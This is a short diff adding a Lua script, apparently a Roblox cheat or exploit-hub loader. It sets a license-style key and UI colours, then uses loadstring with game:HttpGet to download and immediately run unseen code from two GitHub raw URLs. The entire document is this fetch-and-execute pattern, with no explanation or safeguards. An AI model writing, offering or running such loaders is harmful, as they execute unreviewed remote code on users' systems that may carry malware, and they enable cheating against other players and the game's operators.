@@ -1,0 +1,5 @@
+_G.Keys = "T8VWJ-D3OHP-HVN2S"
+_G.Color = Color3.fromRGB(80, 245, 245)
+_G.Color2 = Color3.fromRGB(0, 151, 156)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/deadxzero/noob/main/xeexexeex"))();
